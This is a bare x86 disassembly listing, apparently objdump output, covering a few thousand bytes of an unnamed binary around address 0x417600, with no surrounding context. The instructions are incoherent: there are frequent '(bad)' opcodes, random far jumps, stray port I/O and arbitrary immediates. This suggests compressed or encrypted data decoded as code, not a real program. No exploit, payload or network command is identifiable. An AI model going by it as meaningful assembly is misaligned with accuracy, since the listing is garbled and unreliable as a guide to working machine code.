  417598:	icebp  
  417599:	xlat   BYTE PTR ds:[ebx]
  41759a:	out    dx,al
  41759b:	out    0x68,eax
  41759d:	jmp    0x3ff1f599
  4175a2:	fnstcw WORD PTR [eax+0x6a17a917]
  4175a8:	add    dl,al
  4175aa:	mul    BYTE PTR [edx]
  4175ac:	xchg   edx,eax
  4175ad:	and    eax,0x83e1667b
  4175b2:	or     eax,0x68a476e5
  4175b7:	push   edx
  4175b8:	nop
  4175b9:	and    eax,0x553ddfc0
  4175be:	mov    ch,0x92
  4175c0:	or     BYTE PTR [ecx-0x330b76b],dh
  4175c6:	mov    esi,0xf2378d91
  4175cb:	sub    DWORD PTR [eax-0x53],ebp
  4175ce:	out    dx,eax
  4175cf:	inc    ecx
  4175d0:	cmc    
  4175d1:	dec    ebp
  4175d2:	dec    esi
  4175d3:	bts    DWORD PTR [ebp-0x58],edx
  4175d7:	dec    ax
  4175d9:	daa    
  4175da:	dec    ebp
  4175db:	push   0x6174712b
  4175e0:	in     eax,dx
  4175e1:	inc    ecx
  4175e2:	push   cs
  4175e3:	pop    esp
  4175e4:	enter  0x42cd,0xa3
  4175e8:	and    BYTE PTR [ebx+eax*2],cl
  4175eb:	out    dx,al
  4175ec:	fdiv   st(4),st
  4175ee:	fiadd  DWORD PTR [eax+0x6fcd0843]
  4175f4:	mov    edx,0x78e7a872
  4175f9:	mov    ecx,0x1bedd612
  4175fe:	push   esp
  4175ff:	pop    esp
  417600:	ret    0xe03d
  417603:	mov    al,0x7a
  417605:	or     ebx,edx
  417607:	add    ch,cl
  417609:	lahf   
  41760a:	cld    
  41760b:	mov    bh,0x83
  41760d:	fs pop edi
  41760f:	pop    ecx
  417610:	std    
  417611:	dec    ebp
  417612:	in     al,0x61
  417614:	ds ss inc edi
  417617:	pop    ebp
  417618:	xchg   ecx,eax
  417619:	lds    ebp,FWORD PTR [ebp-0x6c]
  41761c:	inc    edi
  41761e:	mov    cl,0xf5
  417620:	fidivr WORD PTR [edx+0x3d]
  417623:	push   edi
  417624:	mov    ?,eax
  417626:	xchg   esp,eax
  417627:	rcl    BYTE PTR [ecx],cl
  417629:	inc    esi
  41762a:	out    0x65,al
  41762c:	adc    BYTE PTR [esi-0x34f1283f],0xab
  417633:	data16 jnp 0x4175ce
  417636:	(bad)  
  417637:	repz or DWORD PTR [ebx-0x28],ebp
  41763b:	out    0xd2,eax
  41763d:	iret   
  41763e:	or     BYTE PTR [esi+edi*4+0x6c],0xc0
  417643:	mov    ebx,0x7912af63
  417648:	pushf  
  417649:	mov    DWORD PTR fs:[edi+0x3fe29254],ecx
  417650:	sub    BYTE PTR [ebx+0x7a0dff70],bl
  417656:	cmc    
  417657:	sub    cl,BYTE PTR [ecx]
  417659:	prefetch (bad)
  41765a:	or     eax,0x3ca35bdf
  41765f:	mov    bh,0xe7
  417661:	xlat   BYTE PTR ds:[ebx]
  417662:	xchg   esi,eax
  417663:	pop    ebp
  417664:	frstor [ebx+ebx*1+0x1307d43e]
  41766b:	jmp    0x4176cc
	...
  4176d4:	add    BYTE PTR [eax],al
  4176d6:	test   eax,0xdf4fd367
  4176db:	(bad)  
  4176dc:	mov    ebp,0x411f24e7
  4176e1:	fcmovbe st,st(2)
  4176e3:	ret    
  4176e4:	mov    ds:0xfc42ee,eax
  4176e9:	add    bh,bh
  4176eb:	add    BYTE PTR [eax],al
  4176ed:	add    BYTE PTR [edi-0x7a],bh
  4176f0:	jb     0x4176eb
  4176f2:	jecxz  0x417751
  4176f4:	xor    cl,BYTE PTR [edi]
  4176f6:	dec    esp
  4176f7:	xor    BYTE PTR [ecx+0x4f],0xc3
  4176fb:	sti    
  4176fc:	jno    0x4176aa
  4176fe:	sahf   
  4176ff:	dec    ecx
  417700:	jb     0x4176da
  417702:	out    0x4d,al
  417704:	stos   DWORD PTR es:[edi],eax
  417705:	adc    edx,DWORD PTR [ebx+0x1356d9a9]
  41770b:	lahf   
  41770c:	fidivr DWORD PTR [edi]
  41770e:	xchg   esi,eax
  41770f:	or     cl,bl
  417711:	dec    ebx
  417712:	ja     0x41772e
  417714:	pop    ds
  417715:	xor    ah,bl
  417717:	sti    
  417718:	inc    edi
  417719:	add    dh,al
  41771b:	push   esp
  41771c:	test   eax,0x566f05e2
  417721:	or     esi,DWORD PTR [esi+eiz*8-0x21]
  417725:	mov    edx,0x3885e61
  41772a:	xchg   ebx,eax
  41772b:	mov    ebx,0x6cd19277
  417730:	test   DWORD PTR [ecx-0x6e],0x5decfc0f
  417737:	lods   eax,DWORD PTR ds:[esi]
  417738:	dec    esp
  417739:	mov    bh,0xb3
  41773b:	inc    edi
  41773c:	xchg   esp,eax
  41773d:	xchg   edx,eax
  41773e:	push   ebx
  41773f:	outs   dx,BYTE PTR ds:[esi]
  417740:	xchg   ebx,eax
  417741:	pushw  0xbacb
  417745:	add    cl,BYTE PTR [ebx-0x24]
  417748:	mov    ebp,0xc7d91df
  41774d:	and    dl,ah
  41774f:	dec    esi
  417750:	xchg   esi,eax
  417751:	ret    
  417752:	xor    edi,DWORD PTR [edx]
  417754:	jns    0x417793
  417756:	(bad)  
  417758:	xlat   BYTE PTR ds:[ebx]
  417759:	push   ebx
  41775a:	add    BYTE PTR [edi],bh
  41775c:	aas    
  41775d:	pop    es
  41775e:	mov    ch,0x4b
  417760:	push   ecx
  417761:	mov    al,BYTE PTR [esi+0x783b2a58]
  417767:	jecxz  0x4176ee
  417769:	out    dx,eax
  41776a:	sbb    DWORD PTR [eax-0x7fd6ff8b],eax
  417770:	leave  
  417771:	test   BYTE PTR [ecx-0x3e1e5ee3],ch
  417777:	loopne 0x4177e0
  417779:	jns    0x417780
  41777b:	popf   
  41777c:	(bad)  
  41777d:	sti    
  41777e:	sub    dl,BYTE PTR [ecx-0x6c]
  417781:	adc    eax,0x5cd54fe
  417786:	jmp    0x417723
  417788:	pop    ds
  417789:	adc    bh,BYTE PTR [ecx-0x43e6a0fb]
  41778f:	mov    al,ds:0x8d42c742
  417794:	push   eax
  417795:	push   0xffffffa4
  417797:	mov    ch,BYTE PTR [eax+0x5b]
  41779a:	or     cl,BYTE PTR [eax+eax*8+0x448698c9]
  4177a1:	and    esp,ebp
  4177a3:	mov    al,0x69
  4177a5:	call   0x73d3:0xa06b841c
  4177ac:	push   edx
  4177ad:	aad    0x1e
  4177af:	int    0xb0
  4177b1:	(bad)  
  4177b2:	addr16 pop es
  4177b4:	dec    esi
  4177b5:	ror    DWORD PTR [edi-0x2d3847ce],cl
  4177bb:	inc    edx
  4177bc:	loope  0x417763
  4177be:	adc    BYTE PTR [edi+0x8e99f02],dl
  4177c4:	ret    
  4177c5:	repnz adc BYTE PTR [esi-0x34fb9d3a],bh
  4177cc:	push   ecx
  4177cd:	dec    bh
  4177cf:	fucomip st,st(6)
  4177d1:	mov    eax,0x3de79ccb
  4177d6:	clc    
  4177d7:	clc    
  4177d8:	mov    al,0xdb
  4177da:	pop    ebp
  4177db:	push   ds
  4177dc:	bound  eax,QWORD PTR [edx+ebp*8+0x600b1469]
  4177e3:	ds mov dl,ch
  4177e6:	mov    al,ds:0xbb204899
  4177eb:	xchg   esp,eax
  4177ec:	icebp  
	...
  417855:	add    cl,ch
  417857:	push   cs
  417858:	(bad)  
  417859:	pop    ss
  41785a:	push   edi
  41785c:	jmp    0x2334185f
  417861:	rcl    dl,cl
  417863:	loope  0x4177f6
  417865:	call   0x4275ab
  41786a:	inc    DWORD PTR [eax]
  41786c:	add    BYTE PTR [eax],al
  41786e:	dec    ebp
  41786f:	cli    
  417870:	sub    BYTE PTR [ebx-0x4fbd624],al
  417876:	add    BYTE PTR ds:[si],dl
  41787a:	add    eax,ebx
  41787c:	pop    edi
  41787d:	call   0x1fb2:0x8111348a
  417884:	mov    ah,0xb
  417886:	fstp   TBYTE PTR [ecx+0x7a654124]
  41788c:	js     0x417813
  41788e:	sbb    DWORD PTR [eax+0x4477aef8],esp
  417894:	mov    eax,ds:0xadc8176a
  417899:	push   0xa398b4d1
  41789e:	jno    0x417896
  4178a0:	inc    eax
  4178a1:	dec    ecx
  4178a2:	repnz hlt 
  4178a4:	push   ds
  4178a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178a6:	mov    eax,0x4f44dcbd
  4178ab:	fld    QWORD PTR [eax-0x2a8168c7]
  4178b1:	jb     0x4178ab
  4178b3:	mov    esi,0x97cda7b0
  4178b8:	dec    ecx
  4178b9:	pop    es
  4178ba:	pop    esp
  4178bb:	and    ecx,DWORD PTR [ebx]
  4178bd:	inc    edx
  4178be:	add    DWORD PTR [ebx],ebx
  4178c0:	mov    al,ds:0xf85c8c13
  4178c5:	sbb    edi,edi
  4178c7:	in     al,dx
  4178c8:	and    dl,BYTE PTR [edx+0x3c]
  4178cb:	push   edi
  4178cc:	xchg   ebx,eax
  4178cd:	bound  ebx,QWORD PTR [eax]
  4178cf:	and    BYTE PTR [edx+0x6],bl
  4178d2:	jbe    0x4178f8
  4178d4:	jns    0x417861
  4178d6:	repnz stc 
  4178d8:	adc    dh,0xbc
  4178db:	fsubr  DWORD PTR [edx-0x33]
  4178de:	dec    esi
  4178df:	add    BYTE PTR [edx],0xa
  4178e2:	sub    eax,0xa421dc
  4178e7:	pusha  
  4178e8:	les    ebx,FWORD PTR [ecx-0x62e911df]
  4178ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178ef:	outs   dx,BYTE PTR ds:[esi]
  4178f0:	cmp    eax,0x9d6e88ca
  4178f5:	pop    ds
  4178f6:	inc    ebp
  4178f7:	nop
  4178f8:	jne    0x4178e0
  4178fa:	push   0x52d1df57
  4178ff:	mov    eax,gs:0xb62a4037
  417905:	aad    0x99
  417907:	xor    BYTE PTR [esi+0x51aede88],cl
  41790d:	pop    edi
  41790e:	xchg   BYTE PTR [edi],al
  417910:	jo     0x4178b6
  417912:	shr    DWORD PTR [edx],1
  417914:	jb     0x4178c5
  417916:	shl    BYTE PTR [esi+0x59567331],1
  41791c:	sbb    bl,0x48
  41791f:	xchg   esp,eax
  417920:	repz push ss
  417922:	retf   
  417923:	mov    ecx,0x77da8d83
  417928:	mov    eax,0x85f7248e
  41792d:	scas   al,BYTE PTR es:[edi]
  41792e:	jo     0x417965
  417930:	xor    BYTE PTR [eax+0x6c],al
  417933:	sub    eax,0x1766366e
  417938:	lds    edi,FWORD PTR [ebp-0x5d3da51c]
  41793e:	aad    0x61
  417940:	xchg   edx,eax
  417941:	mov    al,0x35
  417943:	xchg   esi,eax
  417944:	push   edx
  417945:	mov    eax,0x5a9820f7
  41794a:	push   0xffffffda
  41794c:	loope  0x41795c
  41794e:	or     al,0x95
  417950:	push   ebx
  417951:	fcmovu st,st(3)
  417953:	jb     0x41797a
  417955:	dec    esp
  417956:	aam    0x2a
  417958:	idiv   BYTE PTR [edx-0x65]
  41795b:	sub    ecx,esi
  41795d:	inc    edi
  41795e:	jecxz  0x41798c
  417960:	dec    edi
  417961:	mov    al,ds:0xf742292e
  417966:	mov    ebp,0x65853581
  41796b:	cmp    esi,DWORD PTR [eax]
	...
  4179d5:	add    BYTE PTR [eax+0x41],bl
  4179d8:	pop    ds
  4179d9:	lods   eax,DWORD PTR ds:[esi]
  4179da:	pop    ds
  4179db:	(bad)  
  4179dc:	cli    
  4179dd:	cmc    
  4179de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179df:	retf   0xe5d4
  4179e2:	mov    dh,0x43
  4179e4:	aam    0x54
  4179e6:	inc    eax
  4179e7:	inc    BYTE PTR [eax]
  4179e9:	add    bh,bh
  4179eb:	add    BYTE PTR [eax],al
  4179ed:	add    BYTE PTR [eax+0x3dd2cb6],cl
  4179f3:	(bad)  [edx-0x3e]
  4179f6:	cld    
  4179f7:	aas    
  4179f8:	mov    dh,0x1f
  4179fa:	jmp    0x9e94:0xf7a27d32
  417a01:	in     eax,dx
  417a02:	mov    ecx,0x3b6e92ba
  417a07:	stos   DWORD PTR es:[edi],eax
  417a08:	adc    dl,BYTE PTR [esp+ebp*1-0x9]
  417a0c:	push   esi
  417a0d:	scas   al,BYTE PTR es:[edi]
  417a0e:	xchg   DWORD PTR ds:0x4bec831b,edx
  417a14:	xchg   ebx,eax
  417a15:	jle    0x417a81
  417a17:	xchg   ebp,eax
  417a18:	les    ebp,FWORD PTR [ecx+0x1e]
  417a1b:	int3   
  417a1c:	hlt    
  417a1d:	lock ds aaa 
  417a20:	sti    
  417a21:	inc    edi
  417a22:	(bad)
  417a25:	xchg   esi,eax
  417a26:	ret    
  417a27:	sbb    al,0x79
  417a29:	cmp    DWORD PTR [ecx-0x5f],ecx
  417a2c:	push   eax
  417a2d:	or     DWORD PTR [esp+esi*8-0x6e],ebx
  417a31:	mov    ecx,0x26e0a491
  417a36:	call   0x6d3ebe7a
  417a3b:	stos   DWORD PTR es:[edi],eax
  417a3c:	pop    ebp
  417a3d:	mov    WORD PTR [edi],cs
  417a3f:	fisubr DWORD PTR [ebx-0x9]
  417a42:	stos   BYTE PTR es:[edi],al
  417a43:	popf   
  417a44:	es fs clc 
  417a47:	mov    bl,0xea
  417a49:	cmp    DWORD PTR [ebx+eiz*4],esi
  417a4c:	(bad)  
  417a4d:	std    
  417a4e:	xor    al,0xed
  417a50:	mov    dh,0x36
  417a52:	mov    ch,0x2
  417a54:	lods   al,BYTE PTR ds:[esi]
  417a56:	ja     0x417a94
  417a58:	inc    eax
  417a59:	sar    DWORD PTR [ebx],cl
  417a5b:	stc    
  417a5c:	or     ebx,ebx
  417a5e:	jle    0x417a4c
  417a60:	push   0x87a9eece
  417a65:	inc    esi
  417a66:	daa    
  417a67:	cwde   
  417a68:	push   0xffffffe3
  417a6a:	xchg   ebx,eax
  417a6b:	sbb    BYTE PTR [eax+0x42],al
  417a6e:	jae    0x417a25
  417a70:	aas    
  417a71:	xor    al,0x9a
  417a73:	and    DWORD PTR [ebp+0x561186fb],edi
  417a79:	fwait
  417a7a:	inc    ebx
  417a7b:	cs dec edx
  417a7d:	imul   ecx,DWORD PTR [edi+edi*8-0x1a],0x47f5b199
  417a85:	inc    eax
  417a86:	sbb    eax,0xe443bf80
  417a8b:	imul   edx,DWORD PTR [ebp-0x4dad6334],0xe9eb3afc
  417a95:	mov    ah,BYTE PTR [ebp-0x26cba9dd]
  417a9b:	cmp    al,0x14
  417a9d:	xchg   esp,eax
  417a9e:	xor    eax,0xb168d790
  417aa3:	rcl    DWORD PTR [edx+0x19],cl
  417aa6:	clc    
  417aa7:	push   0xffffffa1
  417aa9:	push   ds
  417aaa:	xor    ebx,DWORD PTR [edi+eiz*2+0xa060432]
  417ab1:	sahf   
  417ab2:	mov    BYTE PTR [ebx+0x13a5e67],ch
  417ab8:	aam    0x95
  417aba:	fsub   DWORD PTR [ebp-0x1c39009]
  417ac0:	ret    0x5321
  417ac3:	mov    al,0xfa
  417ac5:	lahf   
  417ac6:	xchg   ebp,eax
  417ac7:	and    al,0xe0
  417ac9:	pop    ebp
  417aca:	mov    dl,0xc7
  417acc:	call   0xf2813595
  417ad1:	and    ch,bl
  417ad3:	jmp    0x7ded820
  417ad8:	push   edi
  417ad9:	add    BYTE PTR ds:0xca458617,ch
  417adf:	pop    esi
  417ae0:	test   dh,ah
  417ae2:	push   ds
  417ae3:	sbb    al,0x41
  417ae5:	xor    al,0x17
  417ae7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ae8:	jge    0x417aae
  417aea:	jecxz  0x417b47
  417aec:	add    al,0x0
	...
  417b56:	das    
  417b57:	stos   DWORD PTR es:[edi],eax
  417b58:	cdq    
  417b59:	inc    ecx
  417b5a:	popf   
  417b5b:	jae    0x417b5c
  417b5d:	out    dx,eax
  417b5e:	(bad)  [eax]
  417b60:	xor    ebx,DWORD PTR [ecx-0x3797b173]
  417b66:	aas    
  417b67:	inc    DWORD PTR [eax]
  417b69:	add    bh,bh
  417b6b:	add    BYTE PTR [eax],al
  417b6d:	add    BYTE PTR [ebx+edx*2+0xc2e001c],dh
  417b74:	inc    ebx
  417b75:	xchg   ebp,eax
  417b76:	test   ch,ch
  417b78:	push   ebp
  417b79:	inc    edi
  417b7a:	xchg   BYTE PTR [ecx-0x4b],dl
  417b7d:	add    esp,ecx
  417b7f:	push   eax
  417b81:	push   edi
  417b82:	aaa    
  417b83:	push   eax
  417b84:	dec    ecx
  417b85:	pop    eax
  417b86:	ror    esi,1
  417b88:	adc    eax,0x901ab07f
  417b8d:	cmp    eax,0x2e494619
  417b92:	sbb    al,0xec
  417b94:	cs jae 0x417bf2
  417b97:	and    BYTE PTR [ebp-0x7ba586a2],bh
  417b9d:	dec    esp
  417b9e:	clc    
  417b9f:	retf   
  417ba0:	mov    eax,0x6a84234d
  417ba5:	sub    edi,ebp
  417ba7:	out    0x9f,al
  417ba9:	push   0xed042459
  417bae:	(bad)  
  417baf:	(bad)  
  417bb0:	std    
  417bb1:	in     eax,dx
  417bb2:	fs scas eax,DWORD PTR es:[edi]
  417bb4:	xchg   BYTE PTR [ecx-0x5c],dl
  417bb7:	jecxz  0x417bab
  417bb9:	jecxz  0x417ba1
  417bbb:	mov    al,0x66
  417bbd:	mov    esp,ebp
  417bbf:	add    dh,dl
  417bc1:	test   eax,0x159d0975
  417bc6:	mov    bh,dh
  417bc8:	pop    ecx
  417bc9:	add    ebp,DWORD PTR [esi]
  417bcb:	int3   
  417bcc:	ds jecxz 0x417bc7
  417bcf:	xor    DWORD PTR [edi+0x3f988d2a],esi
  417bd5:	ss mov cl,0x98
  417bd8:	int    0x47
  417bda:	cmp    bl,dh
  417bdc:	out    0xbc,eax
  417bde:	jbe    0x417b61
  417be0:	out    0xae,eax
  417be2:	mov    al,ds:0xe88a6ede
  417be7:	ja     0x417c13
  417be9:	jmp    0xd16a:0x62d3d49e
  417bf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bf1:	jp     0x417ba9
  417bf3:	jg     0x417bd6
  417bf5:	repz leave 
  417bf7:	out    0x73,al
  417bf9:	aas    
  417bfa:	data16 jo 0x417bba
  417bfd:	aas    
  417bfe:	loop   0x417bf5
  417c00:	mov    bh,0x5e
  417c02:	inc    ebx
  417c03:	mov    BYTE PTR [ebx],al
  417c05:	data16 and ah,bl
  417c08:	out    0x86,al
  417c0a:	into   
  417c0b:	add    eax,0xe4576166
  417c10:	or     esi,DWORD PTR [ebp+0x60]
  417c13:	clc    
  417c14:	cmc    
  417c15:	or     DWORD PTR [eax],edx
  417c17:	pop    edi
  417c18:	dec    esi
  417c19:	das    
  417c1a:	in     eax,0x8
  417c1c:	push   ds
  417c1d:	sbb    cl,BYTE PTR [edi-0x2c4ccb5b]
  417c23:	inc    edx
  417c24:	inc    ecx
  417c25:	hlt    
  417c26:	sub    dh,BYTE PTR [edx-0x7a72e002]
  417c2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c2d:	dec    edx
  417c2e:	add    ecx,ecx
  417c30:	out    dx,al
  417c31:	push   WORD PTR [eax-0x181583bb]
  417c38:	sub    bh,bl
  417c3a:	(bad)  
  417c3b:	adc    dh,cl
  417c3d:	mov    esp,0xd4574aaa
  417c42:	ror    BYTE PTR [eax],0x6c
  417c45:	sbb    BYTE PTR [edi],dh
  417c47:	xchg   esp,eax
  417c48:	ror    esi,cl
  417c4a:	cli    
  417c4b:	sbb    ebp,DWORD PTR [edx+0x74]
  417c4e:	add    al,0xd6
  417c50:	inc    esp
  417c51:	retf   0x6991
  417c54:	mov    BYTE PTR [ebx],dl
  417c56:	fisubr WORD PTR [ebp-0x195a26e0]
  417c5c:	rcr    BYTE PTR [ebx+0x9],0x91
  417c60:	xor    BYTE PTR [ebx-0x6c],dl
  417c63:	mul    BYTE PTR [bp+si+0x3]
  417c67:	add    bh,BYTE PTR [ebx+eax*4]
  417c6a:	enter  0xa52b,0x0
	...
  417cd6:	mov    eax,eax
  417cd8:	nop
  417cd9:	test   cl,bl
  417cdb:	aam    0x9d
  417cdd:	int    0x75
  417cdf:	aaa    
  417ce0:	das    
  417ce1:	aam    0x21
  417ce3:	jns    0x417c76
  417ce5:	pop    edx
  417ce6:	add    BYTE PTR ds:[ecx],al
  417ce9:	add    bh,bh
  417ceb:	add    BYTE PTR [eax],al
  417ced:	add    BYTE PTR [ebp+0x4f],dl
  417cf0:	lock frstor [eax-0x43]
  417cf4:	mov    al,ds:0xb7e18b48
  417cf9:	cmp    eax,0x5cbda468
  417cfe:	fmulp  st(5),st
  417d00:	jmp    0x72dc:0x189f2631
  417d07:	enter  0x282a,0x9d
  417d0b:	lds    esp,FWORD PTR [ecx+eax*2]
  417d0e:	(bad)
  417d12:	sub    al,0x22
  417d14:	xor    al,0x48
  417d16:	sahf   
  417d17:	inc    esp
  417d18:	push   eax
  417d19:	cli    
  417d1a:	push   ds
  417d1b:	mov    ch,0x38
  417d1d:	cwde   
  417d1e:	dec    eax
  417d1f:	lds    eax,FWORD PTR [eax-0x3d]
  417d22:	ret    0xeedc
  417d25:	mov    ah,0xb8
  417d27:	mov    edx,0xf0a87882
  417d2c:	jge    0x417d3e
  417d2e:	adc    esp,eax
  417d30:	or     edi,0xabcc08f7
  417d36:	sar    DWORD PTR [eax-0x3c],cl
  417d39:	test   al,0x7c
  417d3b:	mov    ds:0xe881a7c7,eax
  417d40:	out    dx,eax
  417d41:	xchg   BYTE PTR [edx+ebx*1+0x47a429a],ah
  417d48:	lock call 0xad92:0xeda8baba
  417d50:	fnstenv [ebp+eax*8+0x15c06236]
  417d57:	loopne 0x417d16
  417d59:	jmp    0x417d81
  417d5b:	scas   al,BYTE PTR es:[edi]
  417d5c:	sbb    al,0x12
  417d5e:	sub    BYTE PTR [ebx-0xecffb5c],ch
  417d64:	inc    ebx
  417d65:	fisub  WORD PTR [eax+0x36]
  417d68:	adc    DWORD PTR [eax+0x3dddb48d],ebx
  417d6e:	stos   BYTE PTR es:[edi],al
  417d6f:	lods   eax,DWORD PTR ds:[esi]
  417d70:	mov    bl,0x9d
  417d72:	aam    0x72
  417d74:	adc    edx,DWORD PTR [edi-0x5561f941]
  417d7a:	lods   al,BYTE PTR ds:[esi]
  417d7b:	ret    
  417d7c:	(bad)  
  417d7d:	aad    0x23
  417d7f:	dec    esi
  417d80:	fadd   QWORD PTR [edi+0x2b176e2a]
  417d86:	hlt    
  417d87:	scas   eax,DWORD PTR es:[edi]
  417d88:	mov    edi,0x2cf54f32
  417d8d:	inc    ecx
  417d8e:	popf   
  417d8f:	mov    esi,0xde6fbc2d
  417d94:	cwde   
  417d95:	ja     0x417dfb
  417d97:	pop    ds
  417d98:	ja     0x417d42
  417d9a:	jl     0x417d42
  417d9c:	jecxz  0x417d3c
  417d9e:	mov    dl,0xd4
  417da0:	bound  ecx,QWORD PTR [eax-0x52]
  417da3:	and    ch,BYTE PTR es:[edx]
  417da6:	cmp    al,0xf0
  417da8:	jno    0x417d40
  417daa:	sub    BYTE PTR [eax+edi*2+0x4f],cl
  417dae:	and    al,0x5c
  417db0:	lea    ebx,[eax+0x3d5a5257]
  417db6:	xor    BYTE PTR [ebx-0x21],bh
  417db9:	xchg   esp,eax
  417dba:	js     0x417de0
  417dbc:	outs   dx,DWORD PTR ds:[esi]
  417dbd:	cwde   
  417dbe:	mov    bl,0xb7
  417dc0:	lods   al,BYTE PTR ds:[esi]
  417dc1:	test   al,0x9c
  417dc3:	repz pop ecx
  417dc5:	add    ebx,DWORD PTR [ecx+0x17]
  417dc8:	push   ebp
  417dc9:	inc    edi
  417dca:	stos   DWORD PTR es:[edi],eax
  417dcb:	out    0xad,al
  417dcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417dce:	xor    esi,DWORD PTR [ebx+esi*4-0x60]
  417dd2:	sub    dl,BYTE PTR es:[eax+eiz*2+0x30]
  417dd7:	dec    ebp
  417dd8:	mov    dh,0xa8
  417dda:	inc    ebx
  417ddb:	mov    DWORD PTR [edi+ebp*8-0x5b],ebx
  417ddf:	push   ecx
  417de0:	cmc    
  417de1:	pop    edi
  417de2:	(bad)  
  417de3:	and    al,0xfe
  417de5:	or     eax,0xc8b88b9f
  417dea:	mov    ds:0xf0,al
	...
  417e53:	add    BYTE PTR [eax],al
  417e55:	add    BYTE PTR [edi],dl
  417e57:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417e5d:	addr16 dec esi
  417e5f:	sub    BYTE PTR [ecx+0x46],ch
  417e62:	cmp    bh,al
  417e64:	or     bh,dh
  417e66:	cmp    eax,0xff000101
  417e6b:	add    BYTE PTR [eax],al
  417e6d:	add    BYTE PTR [edx+0x2b],cl
  417e70:	jbe    0x417df7
  417e72:	or     eax,0x43957b07
  417e77:	dec    esi
  417e78:	or     al,0x80
  417e7a:	push   esi
  417e7b:	scas   eax,DWORD PTR es:[edi]
  417e7c:	cwde   
  417e7d:	cmp    DWORD PTR [esi-0x26d71f81],ebp
  417e83:	mov    edi,0x751cbb7e
  417e88:	cmp    BYTE PTR [ebx-0x65],cl
  417e8b:	retf   
  417e8c:	(bad)  
  417e8d:	sti    
  417e8e:	push   edi
  417e8f:	loop   0x417ee9
  417e91:	jbe    0x417ee7
  417e93:	xchg   ecx,eax
  417e94:	mov    bl,0x52
  417e96:	es jnp 0x417ef4
  417e99:	xchg   esi,eax
  417e9a:	div    ecx
  417e9c:	das    
  417e9d:	jge    0x417ebc
  417e9f:	cld    
  417ea0:	mov    ebp,0x58235305
  417ea5:	xchg   esi,eax
  417ea6:	stos   DWORD PTR es:[edi],eax
  417ea7:	fwait
  417ea8:	std    
  417ea9:	mov    ds:0x7d5edad2,eax
  417eae:	adc    eax,ecx
  417eb0:	add    ebx,edx
  417eb2:	fwait
  417eb3:	fwait
  417eb4:	in     eax,dx
  417eb5:	loopne 0x417f20
  417eb7:	jns    0x417ec9
  417eb9:	dec    edx
  417eba:	stos   DWORD PTR es:[edi],eax
  417ebb:	in     al,dx
  417ebc:	mov    dl,0x2
  417ebe:	je     0x417e43
  417ec0:	sbb    ah,dh
  417ec2:	pop    ebp
  417ec3:	jmp    0x9f11a941
  417ec8:	jns    0x417e99
  417eca:	inc    edi
  417ecb:	mov    esi,0x1088c0b5
  417ed0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ed1:	jmp    0x6dad:0x6f8a
  417ed7:	shr    BYTE PTR [edx-0x35],cl
  417eda:	scas   al,BYTE PTR es:[edi]
  417edb:	mov    cl,BYTE PTR [edx-0x59]
  417ede:	pop    es
  417edf:	jo     0x417f01
  417ee1:	fs push edx
  417ee3:	mov    DWORD PTR [edi+0x7a],ebx
  417ee6:	sbb    eax,0x63492b5b
  417eeb:	mov    al,ds:0xc52fa5dd
  417ef0:	or     eax,0x418a41d4
  417ef5:	dec    edx
  417ef6:	sub    eax,0x4a3cac4b
  417efb:	test   edx,0xa725d9d1
  417f01:	mov    esi,0x246555dd
  417f06:	inc    eax
  417f07:	jmp    0x5a6d:0x9401c47e
  417f0e:	sub    BYTE PTR [ebp+0x4a],dl
  417f11:	pop    ebp
  417f12:	iret   
  417f13:	cdq    
  417f14:	repnz push eax
  417f16:	hlt    
  417f17:	repz pop ecx
  417f19:	sub    esp,ecx
  417f1b:	jmp    0x10af:0x28473ba4
  417f22:	fdivp  st(6),st
  417f24:	mov    ecx,DWORD PTR [edx+ecx*8+0x41]
  417f28:	into   
  417f29:	jne    0x417f3c
  417f2b:	mov    esp,0xce3dac2a
  417f30:	(bad)  
  417f31:	jbe    0x417f6d
  417f33:	cmp    bh,BYTE PTR [ecx]
  417f35:	pop    esp
  417f36:	pusha  
  417f37:	aaa    
  417f38:	lock clc 
  417f3a:	mov    esp,0xd79bd752
  417f3f:	mov    ebx,0x365b585c
  417f44:	pop    esp
  417f45:	pushf  
  417f46:	hlt    
  417f47:	cld    
  417f48:	sbb    DWORD PTR [esi-0x2dd14dd],edx
  417f4e:	sub    al,0xd0
  417f50:	(bad)  
  417f51:	sbb    eax,0xb07438f
  417f56:	jecxz  0x417f94
  417f58:	out    dx,al
  417f59:	or     al,0x3b
  417f5b:	cmp    bl,BYTE PTR [edx-0x31]
  417f5e:	bound  edx,QWORD PTR [edx+ebp*4-0x78ad9160]
  417f65:	pop    esi
  417f66:	pop    edx
  417f67:	xor    DWORD PTR [esp+edx*2+0x1],edi
  417f6b:	hlt    
  417f6c:	jmp    0x0:0x0
	...
  417fd3:	add    BYTE PTR [eax],al
  417fd5:	add    BYTE PTR [edx-0x1a],ah
  417fd8:	out    0x3b,al
  417fda:	out    0x3b,al
  417fdc:	(bad)  
  417fdd:	push   DWORD PTR [edx]
  417fdf:	xchg   edx,eax
  417fe0:	xor    al,bh
  417fe2:	in     eax,0x58
  417fe4:	and    eax,0x1023cd2
  417fe9:	add    bh,bh
  417feb:	add    BYTE PTR [eax],al
  417fed:	add    BYTE PTR ds:0x9ebfaba5,dh
  417ff3:	and    ebx,ecx
  417ff5:	retf   
  417ff6:	scas   al,BYTE PTR es:[edi]
  417ff7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ff8:	jmp    0x40d6753f
  417ffd:	aaa    
  417ffe:	fcmovu st,st(4)
  418000:	inc    esi
  418001:	jae    0x418030
  418003:	inc    ebx
  418004:	(bad)  
  418005:	cmp    dl,BYTE PTR [ecx]
  418007:	mov    ch,0x98
  418009:	adc    BYTE PTR [eax],dh
  41800b:	scas   eax,DWORD PTR es:[edi]
  41800c:	enter  0xc211,0x62
  418010:	call   0x9c0e:0x45258ec9
  418017:	push   ebx
  418018:	retf   
  418019:	(bad)  
  41801a:	xlat   BYTE PTR ds:[ebx]
  41801b:	lock div DWORD PTR [esi-0x55]
  41801f:	sbb    al,0x54
  418021:	mov    al,0x89
  418023:	and    eax,esp
  418025:	pop    edi
  418026:	popf   
